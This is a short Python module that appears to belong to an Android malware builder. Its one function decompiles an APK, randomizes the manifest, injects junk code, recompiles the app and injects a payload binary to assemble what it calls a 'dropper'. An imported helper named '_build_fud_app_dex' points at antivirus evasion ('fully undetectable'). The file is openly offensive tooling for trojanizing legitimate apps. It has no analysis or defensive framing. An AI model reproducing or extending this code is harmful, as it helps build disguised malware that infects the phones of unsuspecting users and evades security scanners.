import os
import shutil
from apktool_wrapper import decompile, recompile
from manifest import randomize_manifest
from junk_injector import inject_junk
from payload_injector import inject_payload, _build_fud_app_dex, _patch_manifest


def wrap_as_dropper(input_apk: str, output_apk: str, session_dir: str,
                    payload_bin: str):
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)
    randomize_manifest(decompiled)
    inject_junk(decompiled)

    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    inject_payload(decompiled, unsigned, payload_bin, session_dir)

    shutil.copy2(unsigned, output_apk)
    print(f"[✓] dropper assembled → {output_apk}")
